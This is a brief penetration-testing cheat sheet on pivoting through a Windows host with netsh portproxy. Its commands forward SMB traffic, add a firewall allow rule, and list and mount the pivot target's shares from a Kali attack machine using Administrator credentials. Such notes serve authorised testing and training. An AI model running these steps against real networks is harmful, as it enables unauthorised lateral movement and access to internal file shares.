# NETSH

NETSH is installed by default on newer versions of Windows. The IP Helper Service must be running and IPv6 support must be enabled.

```
C:\> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=<windows client IP> connectport=445 connectaddress=<windows pivot target IP>
```

Check the port proxy is listening.

```
C:\> netstat -anp TCP | find "4455"
```

Add a firewall rule to allow traffic out to the attack machine.

```
C:\Windows\system32> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=<windows client IP> localport=4455 action=allow
```

Ensure the attack machine has Samba setup to use a minimum SMB version of 2, edit smb.conf and restart the service as required.

```
kali@kali~:$ sudo nano /etc/samba/smb.conf
...
min protocol = SMB2
```

List the network shares of the windows pivot target

```
kali@kali~:$ smbclient -L <windows client IP> --port=4455 --user=Administrator
```

Create and mount a share to view the windows pivot target

```
kali@kali~:$ sudo mkdir /mnt/win_share
kali@kali~:$ sudo mount -t cifs -o port=4455 //<windows client IP>/<netowrk folder -o username=Administrator,password=<password> /mnt/win_share
```

